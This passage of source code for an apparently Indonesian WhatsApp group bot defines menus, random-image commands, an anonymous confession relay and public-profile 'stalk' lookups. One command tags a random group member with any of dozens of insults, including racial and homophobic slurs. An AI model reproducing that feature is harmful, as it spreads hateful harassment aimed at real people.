│  ${khasmiring}  .ᴄᴇʀᴘᴇɴ ᴘᴇɴʏᴇꜱᴀʟᴀɴ
│  ${khasmiring}  .ᴄᴇʀᴘᴇɴ ᴘᴇʀᴊᴜᴀɴɢᴀɴ
│  ${khasmiring}  .ᴄᴇʀᴘᴇɴ ᴘᴇʀᴘɪꜱᴀʜᴀɴ
│  ${khasmiring}  .ᴄᴇʀᴘᴇɴ ᴘᴇʀꜱᴀʜᴀʙᴀᴛᴀɴ
│  ${khasmiring}  .ᴄᴇʀᴘᴇɴ ᴘᴇᴛᴜᴀʟᴀɴɢᴀɴ
│  ${khasmiring}  .ᴄᴇʀᴘᴇɴ ʀᴀᴍᴀᴅʜᴀɴ
│  ${khasmiring}  .ᴄᴇʀᴘᴇɴ ʀᴇᴍᴀᴊᴀ
│  ${khasmiring}  .ᴄᴇʀᴘᴇɴ ʀɪɴᴅᴜ
│  ${khasmiring}  .ᴄᴇʀᴘᴇɴ ʀᴏʜᴀɴɪ
│  ${khasmiring}  .ᴄᴇʀᴘᴇɴ ʀᴏᴍᴀɴᴛɪꜱ
│  ${khasmiring}  .ᴄᴇʀᴘᴇɴ ꜱᴀꜱᴛʀᴀ
│  ${khasmiring}  .ᴄᴇʀᴘᴇɴ ꜱᴇᴅɪʜ
│  ${khasmiring}  .ᴄᴇʀᴘᴇɴ ꜱᴇᴊᴀʀᴀʜ
╰┈────────────────•

╭┈──────────────────
│ *${m2}${khasatas1} R N D M ‎- P I C ${khasatas2}${m2}*
╭┈──────────────────
│  ${khasmiring}  .ʜɪᴊᴀʙ
│  ${khasmiring}  .ɪɴᴅᴏ
│  ${khasmiring}  .ᴊᴀᴘᴀɴᴇꜱᴇ
│  ${khasmiring}  .ᴋᴏʀᴇᴀɴ
│  ${khasmiring}  .ᴍᴀʟᴀʏ
│  ${khasmiring}  .ʀᴀɴᴅᴏᴍɢɪʀʟ
│  ${khasmiring}  .ʀᴀɴᴅᴏᴍʙᴏʏ
│  ${khasmiring}  .ᴛʜᴀɪ
│  ${khasmiring}  .ᴠɪᴇᴛɴᴀᴍᴇꜱᴇ
│  ${khasmiring}  .ᴀᴇꜱᴛʜᴇᴛɪᴄ
│  ${khasmiring}  .ᴄʜɪɴᴇꜱᴇ
│  ${khasmiring}  .ᴘᴜʙɢ
│  ${khasmiring}  .ᴀɴᴛɪᴡᴏʀᴋ
│  ${khasmiring}  .ʙʟᴀᴄᴋᴘɪɴᴋ2
│  ${khasmiring}  .ᴄᴏꜱᴘʟᴀʏ
│  ${khasmiring}  .ᴄᴀᴛ
│  ${khasmiring}  .ᴅᴏɢɢᴏ
│  ${khasmiring}  .ᴊᴜꜱᴛɪɴᴀ
│  ${khasmiring}  .ᴋᴀʏᴇꜱ
│  ${khasmiring}  .ʙɪᴋᴇ
│  ${khasmiring}  .ʙᴏɴᴇᴋᴀ
│  ${khasmiring}  .ᴋᴘᴏᴘ
│  ${khasmiring}  .ɴᴏᴛɴᴏᴛ
│  ${khasmiring}  .ᴄᴀʀ
│  ${khasmiring}  .ᴄᴏᴜᴘʟᴇᴘɪᴄ
│  ${khasmiring}  .ᴘʀᴏꜰɪʟᴇᴘɪᴄ
│  ${khasmiring}  .ʀᴏꜱᴇ
│  ${khasmiring}  .ʀʏᴜᴊɪɴ
│  ${khasmiring}  .ᴜʟᴢᴀɴɢʙᴏʏ
│  ${khasmiring}  .ᴜʟᴢᴀɴɢɢɪʀʟ
│  ${khasmiring}  .ᴍᴏʙɪʟᴇʟᴇɢᴇɴᴅ
╰┈────────────────•

  ⟢• ──────────────── •⟢
  |‎‎ ‎ ${m2}< ‎ ‎‎ ‎ ‎${footer} ‎  ‎‎‎</>${m2}  
  ⟢• ──────────────── •⟢
 `

if (global.setmenu === "v3") {
ptz.sendMessage(m.chat, { 
text: tesk,
contextInfo:{
mentionedJid:[m.sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": global.shinka,
"body": global.body,
"sourceUrl": global.sourceurl,
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync("./biasa.jpg"),
}
}
},{ 
quoted: m })
} else if (global.setmenu === "v2") {
ptz.sendMessage(m.chat, {
document: fs.readFileSync("./package.json"),
fileName: global.filename,
mimetype: 'application/msword',
jpegThumbnail:fs.readFileSync("./thum.jpg"),
caption: `${mnop0}`,
contextInfo: {
forwardingScore: 10,
 isForwarded: true,
forwardedNewsletterMessageInfo: {
            newsletterJid: global.idsaluran,
            serverMessageId: null,
            newsletterName: global.namesaluran
        },
externalAdReply: {
showAdAttribution: true,
title: global.title,
body: global.body ,
thumbnail: fs.readFileSync('./digimon.jpg'),
sourceUrl: global.sourceurl,
mediaType: 1,
renderLargerThumbnail: true 
}}}, {});
} else if (global.setmenu === "v1") {
ptz.sendMessage(m.chat, {
document: fs.readFileSync("./package.json"),
fileName: global.filename,
mimetype: 'application/msword',
jpegThumbnail:fs.readFileSync("./thum.jpg"),
caption: `${mnop0}`,
contextInfo: {
forwardingScore: 10,
 isForwarded: true,
forwardedNewsletterMessageInfo: {
            newsletterJid: global.idsaluran,
            serverMessageId: null,
            newsletterName: global.namesaluran
        },
externalAdReply: {
showAdAttribution: true,
title: global.title,
body: global.body ,
thumbnail: fs.readFileSync('./digimon.jpg'),
sourceUrl: global.sourceurl,
mediaType: 1,
renderLargerThumbnail: true 
}}}, {});
}
break

case "gametutor":
reply(`*${m2}[ GAME - RESPONSE TUTOR ]${m2}*

*<!> Answer questions*

You can answer questions easily - the method is: .answer _answer_ using all lowercase letters, if the question contains all uppercase letters - use uppercase letters: .answer MONEY, for games other than guessing and caklontong you don't need to use the command .answer , go straight to the selection.
`)
break

case 'confess': case 'confes': case 'menfes': case 'menfess':{
ptz.menfes = ptz.menfes ? ptz.menfes : {}
roof = Object.values(ptz.menfes).find(menpes => [menpes.a, menpes.b].includes(m.sender))
if (roof) return reply("Kamu masih berada dalam sesi menfess")
if (!text) return reply(`Kirim Perintah ${prefix + command} nama|nomor|pesan\n\nContoh :\n${prefix + command} ${pushname}|628xxx|Menfes nih\n`)
if (!text.includes('|')) return reply(`Kirim Perintah ${prefix + command} nama|nomor|pesan\n\nContoh :\n${prefix + command} ${pushname}|6292818802718|Menfes nih\n`)
let [namaNya, nomorNya, pesanNya] = text.split`|`
if (nomorNya.startsWith('0')) return reply(`Kirim Perintah ${prefix + command} nama|nomor|pesan\n\nContoh :\n${prefix + command} ${pushname}|628xxx|Menfes nih\n`)
if(isNaN(nomorNya)) return reply(`Kirim Perintah ${prefix + command} nama|nomor|pesan\n\nContoh :\n${prefix + command} ${pushname}|628xxx|Menfes nih\n`)
var yoi = `Hi ada menfess nih buat kamu\n\nDari : ${namaNya}\nPesan : ${pesanNya}\n\nSilahkan ketik ${prefix}balasmenfess -- Untuk menerima menfess/confess\nSilahkan ketik ${prefix}tolakmenfess -- Untuk menolak menfess/confess\n\n_Pesan ini di tulis oleh seseorang pengguna bot, bot hanya menyampaikan saja_`
let tod = await getBuffer('https://telegra.ph/file/c8fdfc8426f5f60b48cca.jpg') 
let id = m.sender
ptz.menfes[id] = {
id,
a: m.sender,
b: nomorNya + "@s.whatsapp.net",
state: 'WAITING'
}
 await ptz.sendMessage(nomorNya + '@s.whatsapp.net', {image: tod, caption:yoi }, {})
reply('Pesan berhasil dikirim ke nomor tujuan. Moga aja dibales coy')
}
break
case 'balasmenfess': case 'balasmenfes': case 'accmenfess':{
let roof = Object.values(ptz.menfes).find(menpes => [menpes.a, menpes.b].includes(m.sender));
if (!roof) return reply("Belum ada sesi menfess");
let room = Object.values(ptz.menfes).find(room => [room.a, room.b].includes(m.sender) && room.state === 'WAITING');
if (!room) return reply("Tidak ada sesi menfess yang sedang menunggu");
let other = [room.a, room.b].find(user => user !== m.sender);
room.b = m.sender;
room.state = 'CHATTING';
ptz.menfes[room.id] = {...room};
await ptz.sendMessage(other, { 
  text: `_@${m.sender.split("@")[0]} telah menerima menfess kamu, sekarang kamu bisa chat lewat bot ini .chatfes_\n\n*NOTE :*\nJika ingin berhenti dari menfess, silahkan ketik .stopmenfess`, 
  mentions: [m.sender]
});
ptz.sendMessage(m.chat, { 
  text: `_Menfess telah diterima, sekarang kamu bisa chatan lewat bot ini .chatfes_\n\n*NOTE :*\nJika ingin berhenti dari menfess, silahkan ketik .stopmenfess`
});
}
break
 case 'tolakmenfess': case 'tolakmenfes': case 'rejecmenfess':{
roof = Object.values(ptz.menfes).find(menpes => [menpes.a, menpes.b].includes(m.sender))
if (!roof) return reply("Belum ada sesi menfess")
let room = Object.values(ptz.menfes).find(room => [room.a, room.b].includes(m.sender) && room.state === 'WAITING')
let other = [room.a, room.b].find(user => user !== m.sender)
find = Object.values(ptz.menfes).find(menpes => menpes.state == 'WAITING')
ptz.sendMessage(other, {text: `_Uppsss... @${m.sender.split("@")[0]} Menolak menfess kamu_`, mentions: [m.sender]})
// await ptz.sendMessage(find.a, {text: `_Uppsss... @${find.b.split("@")[0]} Menolak menfess kamu_`,mentions: [find.b]})
reply("Menfess berhasil di tolak 🤚")
delete ptz.menfes[roof.id]
}
break
 case 'stopconfess': case 'stopmenfess': {
 //find = Object.values(ptz.menfes).find(menpes => menpes.state == 'WAITING')
find = Object.values(ptz.menfes).find(menpes => [menpes.a, menpes.b].includes(m.sender))
if (!find) return reply("Belum ada sesi menfess")
const to = find.a == m.sender ? find.b : find.a
ptz.sendMessage(to, {text: `_Teman chat telah menghentikan menfess ini_`, mentions:[m.sender]})
await reply("ok")
delete ptz.menfes[find.id]
}
 break

case 'chatfes': {
    let find = Object.values(ptz.menfes).find(menpes => [menpes.a, menpes.b].includes(m.sender) && menpes.state === 'CHATTING');
    if (!find) return reply("Kamu tidak berada dalam sesi menfess yang sedang aktif.");
    const to = find.a === m.sender ? find.b : find.a;
    if (!text) return reply("Silakan masukkan pesan yang ingin dikirim.");
    await ptz.sendMessage(to, {
        text: `*Pesan dari Menfess*\n\n${text}`,
        mentions: [m.sender]
    });
    m.reply("Pesan berhasil dikirim ke partner menfess.");
}
break;
    

case 'hijab':

var notnot = JSON.parse(fs.readFileSync('./RImage/tiktokpics/hijab.json'))
var iiiiiiiiiii = pickRandom(notnot)
ptz.sendMessage(m.chat, { caption: 'don banh', image: { url: iiiiiiiiiii.url } }, { quoted: m })
break

case 'indo':

var notnot = JSON.parse(fs.readFileSync('./RImage/tiktokpics/indonesia.json'))
var iiiiiiiiiiii = pickRandom(notnot)
ptz.sendMessage(m.chat, { caption: 'don banh', image: { url: iiiiiiiiiiii.url } }, { quoted: m })
break
case 'japanese':

var notnot = JSON.parse(fs.readFileSync('./RImage/tiktokpics/japan.json'))
var iiiiiiiiiiiii = pickRandom(notnot)
ptz.sendMessage(m.chat, { caption: 'don banh', image: { url: iiiiiiiiiiiii.url } }, { quoted: m })
break
case 'korean':

var notnot = JSON.parse(fs.readFileSync('./RImage/tiktokpics/korea.json'))
var iiiiiiiiiiiiii = pickRandom(notnot)
ptz.sendMessage(m.chat, { caption: 'don banh', image: { url: iiiiiiiiiiiiii.url } }, { quoted: m })
break
case 'malay':

var notnot = JSON.parse(fs.readFileSync('./RImage/tiktokpics/malaysia.json'))
var iiiiiiiiiiiiiii = pickRandom(notnot)
ptz.sendMessage(m.chat, { caption: 'don banh', image: { url: iiiiiiiiiiiiiii.url } }, { quoted: m })
break
case 'randomgirl':

var notnot = JSON.parse(fs.readFileSync('./RImage/tiktokpics/random.json'))
var iiiiiiiiiiiiiiii = pickRandom(notnot)
ptz.sendMessage(m.chat, { caption: 'don banh', image: { url: iiiiiiiiiiiiiiii.url } }, { quoted: m })
break
case 'randomboy':

var notnot = JSON.parse(fs.readFileSync('./RImage/tiktokpics/random2.json'))
var iiiiiiiiiiiiiiiii = pickRandom(notnot)
ptz.sendMessage(m.chat, { caption: 'don banh', image: { url: iiiiiiiiiiiiiiiii.url } }, { quoted: m })
break
case 'thai':

var notnot = JSON.parse(fs.readFileSync('./RImage/tiktokpics/thailand.json'))
var iiiiiiiiiiiiiiiiii = pickRandom(notnot)
ptz.sendMessage(m.chat, { caption: 'don banh', image: { url: iiiiiiiiiiiiiiiiii.url } }, { quoted: m })
break
case 'vietnamese':

var notnot = JSON.parse(fs.readFileSync('./RImage/tiktokpics/vietnam.json'))
var iiiiiiiiiiiiiiiiiii = pickRandom(notnot)
ptz.sendMessage(m.chat, { caption: 'don banh', image: { url: iiiiiiiiiiiiiiiiiii.url } }, { quoted: m })
break
case 'aesthetic':

var notnot = JSON.parse(fs.readFileSync('./RImage/randompics/aesthetic.json'))
var iiiiiiiiiiiiiiiiiiii = pickRandom(notnot)
ptz.sendMessage(m.chat, { caption: 'don banh', image: { url: iiiiiiiiiiiiiiiiiiii.url } }, { quoted: m })
break
case 'antiwork':

var notnot = JSON.parse(fs.readFileSync('./RImage/randompics/antiwork.json'))
var iiiiiiiiiiiiiiiiiiiii = pickRandom(notnot)
ptz.sendMessage(m.chat, { caption: 'don banh', image: { url: iiiiiiiiiiiiiiiiiiiii.url } }, { quoted: m })
break
case 'blackpink2':

var notnot = JSON.parse(fs.readFileSync('./RImage/randompics/blackpink.json'))
var iiiiiiiiiiiiiiiiiiiiii = pickRandom(notnot)
ptz.sendMessage(m.chat, { caption: 'don banh', image: { url: iiiiiiiiiiiiiiiiiiiiii.url } }, { quoted: m })
break
case 'bike':

var notnot = JSON.parse(fs.readFileSync('./RImage/randompics/bike.json'))
var iiiiiiiiiiiiiiiiiiiiiii = pickRandom(notnot)
ptz.sendMessage(m.chat, { caption: 'don banh', image: { url: iiiiiiiiiiiiiiiiiiiiiii.url } }, { quoted: m })
break
case 'boneka':

var notnot = JSON.parse(fs.readFileSync('./RImage/randompics/boneka.json'))
var iiiiiiiiiiiiiiiiiiiiiiii = pickRandom(notnot)
ptz.sendMessage(m.chat, { caption: 'don banh', image: { url: iiiiiiiiiiiiiiiiiiiiiiii.url } }, { quoted: m })
break
case 'cosplay':

var notnot = JSON.parse(fs.readFileSync('./RImage/randompics/cosplay.json'))
var iiiiiiiiiiiiiiiiiiiiiiiii = pickRandom(notnot)
ptz.sendMessage(m.chat, { caption: 'don banh', image: { url: iiiiiiiiiiiiiiiiiiiiiiiii.url } }, { quoted: m })
break
case 'cat':

var notnot = JSON.parse(fs.readFileSync('./RImage/randompics/cat.json'))
var iiiiiiiiiiiiiiiiiiiiiiiiii = pickRandom(notnot)
ptz.sendMessage(m.chat, { caption: 'don banh', image: { url: iiiiiiiiiiiiiiiiiiiiiiiiii.url } }, { quoted: m })
break
case 'doggo':

var notnot = JSON.parse(fs.readFileSync('./RImage/randompics/doggo.json'))
var iiiiiiiiiiiiiiiiiiiiiiiiiil = pickRandom(notnot)
ptz.sendMessage(m.chat, { caption: 'don banh', image: { url: iiiiiiiiiiiiiiiiiiiiiiiiiil.url } }, { quoted: m })
break
case 'justina':

var notnot = JSON.parse(fs.readFileSync('./RImage/randompics/justina.json'))
var iiiiiiiiiiiiiiiiiiiiiiiiiill = pickRandom(notnot)
ptz.sendMessage(m.chat, { caption: 'don banh', image: { url: iiiiiiiiiiiiiiiiiiiiiiiiiill.url } }, { quoted: m })
break

case 'kayes':

var notnot = JSON.parse(fs.readFileSync('./RImage/randompics/kayes.json'))
var iiiiiiiiiiiiiiiiiiiiiiiiiilll = pickRandom(notnot)
ptz.sendMessage(m.chat, { caption: 'don banh', image: { url: iiiiiiiiiiiiiiiiiiiiiiiiiilll.url } }, { quoted: m })
break
case 'kpop':

var notnot = JSON.parse(fs.readFileSync('./RImage/randompics/kpop.json'))
var ll = pickRandom(notnot)
ptz.sendMessage(m.chat, { caption: 'don banh', image: { url: ll.url } }, { quoted: m })
break
case 'notnot':

var notnot = JSON.parse(fs.readFileSync('./RImage/randompics/notnot.json'))
var lll = pickRandom(notnot)
ptz.sendMessage(m.chat, { caption: 'don banh', image: { url: lll.url } }, { quoted: m })
break
case 'car':

var notnot = JSON.parse(fs.readFileSync('./RImage/randompics/car.json'))
var llll = pickRandom(notnot)
ptz.sendMessage(m.chat, { caption: 'don banh', image: { url: llll.url } }, { quoted: m })
break
case 'couplepic':case 'couplepicture':

var notnot = JSON.parse(fs.readFileSync('./RImage/randompics/ppcouple.json'))
var lllll = pickRandom(notnot)
ptz.sendMessage(m.chat, { caption: 'don banh', image: { url: lllll.url } }, { quoted: m })
break
case 'profilepic':  case 'profilepicture':

var notnot = JSON.parse(fs.readFileSync('./RImage/randompics/profile.json'))
var llllll = pickRandom(notnot)
ptz.sendMessage(m.chat, { caption: 'don banh', image: { url: llllll.url } }, { quoted: m })
break
case 'pubg':

var notnot = JSON.parse(fs.readFileSync('./RImage/randompics/pubg.json'))
var lllllll = pickRandom(notnot)
ptz.sendMessage(m.chat, { caption: 'don banh', image: { url: lllllll.url } }, { quoted: m })
break
case 'rose':

var notnot = JSON.parse(fs.readFileSync('./RImage/randompics/rose.json'))
var llllllll = pickRandom(notnot)
ptz.sendMessage(m.chat, { caption: 'don banh', image: { url: llllllll.url } }, { quoted: m })
break
case 'ryujin':

var notnot = JSON.parse(fs.readFileSync('./RImage/randompics/ryujin.json'))
var lllllllll = pickRandom(notnot)
ptz.sendMessage(m.chat, { caption: 'don banh', image: { url: lllllllll.url } }, { quoted: m })
break
case 'ulzzangboy':

var notnot = JSON.parse(fs.readFileSync('./RImage/randompics/ulzzangboy.json'))
var llllllllll = pickRandom(notnot)
ptz.sendMessage(m.chat, { caption: 'don banh', image: { url: llllllllll.url } }, { quoted: m })
break
case 'ulzzanggirl':

var notnot = JSON.parse(fs.readFileSync('./RImage/randompics/ulzzanggirl.json'))
var lllllllllll = pickRandom(notnot)
ptz.sendMessage(m.chat, { caption: 'don banh', image: { url: lllllllllll.url } }, { quoted: m })
break
case 'wallml': case 'wallpaperml':case 'mobilelegend':

var notnot = JSON.parse(fs.readFileSync('./RImage/randompics/wallml.json'))
var llllllllllll = pickRandom(notnot)
ptz.sendMessage(m.chat, { caption: 'don banh', image: { url: llllllllllll.url } }, { quoted: m })
break

case 'chinese':

var notnot = JSON.parse(fs.readFileSync('./RImage/tiktokpics/china.json'))
var iiiiiiiiii = pickRandom(notnot)
ptz.sendMessage(m.chat, { caption: 'don banh', image: { url: iiiiiiiiii.url } }, { quoted: m })
break

case 'wallpaperphone': case 'wallphone':

var notnot = JSON.parse(fs.readFileSync('./RImage/randompics/wallhp.json'))
var lllllllllllll = pickRandom(notnot)
ptz.sendMessage(m.chat, { caption: 'don banh', image: { url: lllllllllllll.url } }, { quoted: m })
break

case "cerpen":
if (!text) return m.reply('`Masukan type: .cerpen anak`')
 function cerpen(category) {
    return new Promise(async (resolve, reject) => {
        try {
            let title = category.toLowerCase().replace(/[()*]/g, "");
            let judul = title.replace(/\s/g, "-");
            let page = Math.floor(Math.random() * 5) + 1;  

            let get = await axios.get('http://cerpenmu.com/category/cerpen-' + judul + '/page/' + page);
            let $ = cheerio.load(get.data);
            let link = [];

            $('article.post').each(function (a, b) {
                link.push($(b).find('a').attr('href'));
            });

            if (link.length === 0) {
                return reject("No stories found for this category.");
            }

            let random = link[Math.floor(Math.random() * link.length)];
            let res = await axios.get(random);
            let $$ = cheerio.load(res.data);

            let hasil = {
                title: $$('#content > article > h1').text(),
                author: $$('#content > article').text().split('Cerpen Karangan: ')[1]?.split('Kategori: ')[0]?.trim(),
                kategori: $$('#content > article').text().split('Kategori: ')[1]?.split('\n')[0]?.trim(),
                lolos: $$('#content > article').text().split('Lolos moderasi pada: ')[1]?.split('\n')[0]?.trim(),
                cerita: $$('#content > article > p').text()
            };

            resolve(hasil);
        } catch (error) {
            reject(error);
        }
    });
}


    try {
        var data = await cerpen(text);
        var textpp = `Title : ${data.title}\n`;
        textpp += `Author : ${data.author}\n`;
        textpp += `Category : ${data.kategori}\n`;
        textpp += `Approved on : ${data.lolos}\n`;
        textpp += `Story :\n${data.cerita}`;

        reply(textpp);
    } catch (error) {
        console.error(error);
        m.reply("An error occurred while fetching the story.");
    }
break

case 'tolol':
      case 'gaguna':
      case 'jomok':
      case 'idiot':
      case 'gay':
      case 'lesbi':
      case 'anjink':
      case 'babi':
      case 'kucing':
      case 'beban':
      case 'bebankeluarga':
      case 'gadakeluarga':
      case 'miskin':
      case 'sampah':
      case 'wibu':
      case 'cantik':
      case 'ganteng':
      case 'tampan':
      case 'cute':
      case 'kind':
      case 'Islam':
      case 'kristen':
      case 'hindu':
      case 'katolik':
      case 'gandu':
      case 'madarchod':
      case 'kala':
      case 'gora':
      case 'chutiya':
      case 'nibba':
      case 'nibbi':
      case 'bhosdiwala':
      case 'chutmarika':
      case 'bokachoda':
      case 'suarerbaccha':
      case 'bolochoda':
      case 'muthal':
      case 'muthbaaz':
      case 'randibaaz':
      case 'topibaaz':
      case 'cunt':
      case 'nerd':
      case 'behenchod':
      case 'behnchoda':
      case 'bhosdika':
      case 'nerd':
      case 'mc':
      case 'bsdk':
      case 'bhosdk':
      case 'nigger':
      case 'loda':
      case 'laund':
      case 'nigga':
      case 'noobra':
      case 'tharki':
      case 'nibba':
      case 'nibbi':
      case 'mumu':
      case 'rascal':
      case 'scumbag':
      case 'nuts':
      case 'comrade':
      case 'fagot':
      case 'scoundrel':
      case 'ditch':
      case 'dope':
      case 'gucci':
      case 'lit':
      case 'dumbass':
      case 'sexy':
      case 'crackhead':
      case 'motherfucker':
      case 'dogla':
      case 'bewda':
      case 'boka':
      case 'khanki':
      case 'bal':
      case 'sucker':
      case 'fuckboy':
      case 'playboy':
      case 'fuckgirl':
      case 'playgirl':
      case 'hot': {
if (!m.isGroup) return m.reply('Khusus Group')
let member = participants.map((u) => u.id)
let org = member[Math.floor(Math.random() * member.length)]
ptz.sendMessage(m.chat,
{ text: `The Most ${command} Here Is @${org.split("@")[0]}`,
contextInfo:{
mentionedJid:[org],
forwardingScore: 9999999,
isForwarded: true, 
"externalAdReply": {
"showAdAttribution": true,
"containsAutoReply": true,
"title": `- Bercanda -`,
"body": global.body,
"previewType": "PHOTO",
"thumbnailUrl": ``,
"thumbnail": fs.readFileSync(`./1x1.jpg`),
"sourceUrl": global.sourceurl}}},
{ quoted: m})
}
break

      case 'roll': {
  if (!text) return m.reply("Masukan alasan untuk yang terpilih")
if (!m.isGroup) return m.reply('Khusus Group')
let memberiii = participants.map((u) => u.id)
let orgnyater = memberiii[Math.floor(Math.random() * memberiii.length)]
ptz.sendMessage(m.chat,
{ text: `${text}:\n\n• @${orgnyater.split("@")[0]}`,
contextInfo:{
mentionedJid:[org],
forwardingScore: 9999999,
isForwarded: true, 
"externalAdReply": {
"showAdAttribution": true,
"containsAutoReply": true,
"title": `- Seseorang Terpilih -`,
"body": global.body,
"previewType": "PHOTO",
"thumbnailUrl": ``,
"thumbnail": fs.readFileSync(`./1x1.jpg`),
"sourceUrl": global.sourceurl}}},
{ quoted: m})
}
break

case 'npmstalk':{
if (!q) return reply(`Example ${prefix+command} axios`)
eha = await npmstalk(q)
reply(`*NPM STALK*

Name : ${eha.name}
Version Latest : ${eha.versionLatest}
Version Publish : ${eha.versionPublish}
Version Update : ${eha.versionUpdate}
Publish Time : ${eha.publishTime}
Latest Dependencies : ${eha.latestDependencies}
Publish Dependencies : ${eha.publishDependencies}
Latest Publish Time : ${eha.latestPublishTime}`)
}
break

case 'tiktokstalk':{
if (!q) return reply(`Example: ${prefix+command} username`)
try {
let anu = await fetchJson(`https://api.junn4.my.id/tools/tiktokstalk?username=${q}`)
const nick = anu.result.name
const username = anu.result.username
const foll = anu.result.followers
const foli = anu.result.following
const desk = anu.result.description
 ptz.sendMessage(m.chat, { image: { url: anu.result.pp_user}, caption: `Name : ${nick}\nUsername : ${username}\nFollowers : ${foll}\nFollowing : ${foli}\nDescription : ${desk}`}, {quoted: m})
} catch (error) {
reply(`Error!\nPastikan username sama persis dan akun tidak di privat.`);
}
}

break

case 'ghstalk':
if (!text) return reply('Harap Masukan Username')

    let nya = await fetch(`https://api.github.com/users/${text}`).then(a => a.json())
    let thumb = await getBuffer(nya.avatar_url)
    let hasil = `*GITHUB STALK*
*Bio*: ${nya.bio}
*Perusahaan*: ${nya.company}
*Repo Publik:* ${nya.public_repos}
*Gists Publik:* ${nya.public_gists}
*Follower:* ${nya.followers}
*Following:* ${nya.following}
*Lokasi:* ${nya.location}
*Link:* ${nya.html_url}
`
ptz.sendMessage(m.chat, { image: thumb, caption: hasil, quoted: m })
break

case 'igstalk': {
if (!args[0]) return m.reply(`Enter Instagram Username\n\nExample : ${prefix + command} bg.dalwin`)
const fgo = require('api-dylux')
    try {
    let res = await fgo.igStalk(args[0])
    let te = `*STALKING* 

*Name :* ${res.name} 
*Username :* ${res.username}
*Follower :* ${res.followersH}
*Following :* ${res.followingH}
*Bio :* ${res.description}
*Posts :* ${res.postsH}
*Link* : https://instagram.com/${res.username.replace(/^@/, '')}`
     await ptz.sendMessage(m.chat, {image: { url: res.profilePic }, caption: te }, {quoted: m})
      } catch {
        reply(`lihat username yang valid di *Instagram*`)
      }
}
break

case "funmenu":
reply(`╭┈──────────────────
│ *${m2}${khasatas1} F U N - M E N U ‎${khasatas2}${m2}*
╭┈──────────────────
│  ${khasmiring}  .ᴄᴇᴋᴋʜᴏᴅᴀᴍ
│  ${khasmiring}  .ʙɪꜱᴀᴋᴀʜ
│  ${khasmiring}  .ɢɪᴍᴀɴᴀ
│  ${khasmiring}  .ᴀᴘᴀᴋᴀʜ
│  ${khasmiring}  .ᴋᴀᴘᴀɴᴋᴀʜ
│  ${khasmiring}  .ᴡᴀᴛᴀᴋᴄᴇᴋ
│  ${khasmiring}  .ʜᴏʙʙʏᴄᴇᴋ
│  ${khasmiring}  .ᴄᴇᴋᴍᴇᴋɪ
│  ${khasmiring}  .ᴄᴇʙᴇʟᴀᴘᴀɪᴍᴜᴛᴄɪᴀᴋᴜ
│  ${khasmiring}  .ᴄᴇᴋᴍᴇ
│  ${khasmiring}  .ᴄᴇᴋᴋᴏɴᴛᴏʟ
╰┈────────────────•

  ⟢• ──────────────── •⟢
  |‎‎ ‎ ${m2}< ‎ ‎‎ ‎ ‎${footer} ‎  ‎‎‎</>${m2}  
  ⟢• ──────────────── •⟢`)
break
case "addmenu":
reply(`╭┈──────────────────
│ *${m2}${khasatas1} S E T - C M D ‎${khasatas2}${m2}*
╭┈──────────────────
│  ${khasmiring}  .ꜱᴇᴛᴄᴍᴅ
│  ${khasmiring}  .ᴅᴇʟᴄᴍᴅ
│  ${khasmiring}  .ʟɪꜱᴛᴄᴍᴅ
│  ${khasmiring}  .ᴀᴅᴅᴘᴅꜰ
│  ${khasmiring}  .ᴅᴇʟᴘᴅꜰ
│  ${khasmiring}  .ʟɪꜱᴛᴘᴅꜰ
│  ${khasmiring}  .ʏᴏᴘᴅꜰ
│  ${khasmiring}  .ꜱᴇɴᴅᴘᴅꜰ
│  ${khasmiring}  .ᴀᴅᴅᴢɪᴘ
│  ${khasmiring}  .ᴅᴇʟᴢɪᴘ
│  ${khasmiring}  .ʟɪꜱᴛᴢɪᴘ
│  ${khasmiring}  .ʏᴏᴢɪᴘ
│  ${khasmiring}  .ꜱᴇɴᴅᴢɪᴘ
│  ${khasmiring}  .ᴀᴅᴅᴀᴘᴋ
│  ${khasmiring}  .ᴅᴇʟᴀᴘᴋ
│  ${khasmiring}  .ʟɪꜱᴛᴀᴘᴋ
│  ${khasmiring}  .ʏᴏᴀᴘᴋ
│  ${khasmiring}  .ꜱᴇɴᴅᴀᴘᴋ
│  ${khasmiring}  .ᴀᴅᴅᴠɴ
│  ${khasmiring}  .ᴅᴇʟᴠɴ
│  ${khasmiring}  .ʟɪꜱᴛᴠɴ
│  ${khasmiring}  .ᴀᴅᴅᴍꜱɢ
│  ${khasmiring}  .ꜱᴇɴᴅʟɪꜱᴛ
│  ${khasmiring}  .ʟɪꜱᴛᴍꜱɢ
│  ${khasmiring}  .ᴅᴇʟᴍꜱɢ
│  ${khasmiring}  .ɢᴇᴛᴍꜱɢ
╰┈────────────────•

  ⟢• ──────────────── •⟢
  |‎‎ ‎ ${m2}< ‎ ‎‎ ‎ ‎${footer} ‎  ‎‎‎</>${m2}  
  ⟢• ──────────────── •⟢`)
break

case "primbon": case "primbo":
reply(`╭┈──────────────────
│ *${m2}${khasatas1} P R M B O N - M E N U ‎${khasatas2}${m2}*
╭┈──────────────────
│  ${khasmiring}  .ᴀʀᴛɪɴᴀᴍᴀ 
│  ${khasmiring}  .ᴀʀᴛɪᴍɪᴍᴘɪ 
│  ${khasmiring}  .ᴋᴇᴄᴏᴄᴏᴋᴀɴᴘᴀꜱᴀɴɢᴀɴ 
│  ${khasmiring}  .ᴋᴇᴄᴏᴄᴏᴋᴀɴɴᴀᴍᴀ 
│  ${khasmiring}  .ᴊᴀᴅɪᴀɴᴘᴇʀɴɪᴋᴀʜᴀɴ 
│  ${khasmiring}  .ʀᴇᴊᴇᴋɪ 
│  ${khasmiring}  .ꜱɪꜰᴀᴛᴜꜱᴀʜᴀ 
│  ${khasmiring}  .ᴘᴇᴋᴇʀᴊᴀᴀɴ 
│  ${khasmiring}  .ᴀʀᴛɪᴛᴀʀᴏᴛ 
│  ${khasmiring}  .ᴘᴏᴛᴇɴꜱɪᴘᴇɴʏᴀᴋɪᴛ 
│  ${khasmiring}  .ʀᴀᴍᴀʟᴀɴɴᴀꜱɪʙ 
│  ${khasmiring}  .ʜᴀʀɪꜱᴀɴɢᴀʀ 
│  ${khasmiring}  .ʜᴀʀɪʙᴀɪᴋ 
│  ${khasmiring}  .ꜰᴇɴɢꜱʜᴜɪ 
│  ${khasmiring}  .ɴᴀɢᴀʜᴀʀɪ
│  ${khasmiring}  .ʜᴀʀɪɴᴀᴀꜱ 
│  ${khasmiring}  .ᴡᴇᴛᴏɴ 
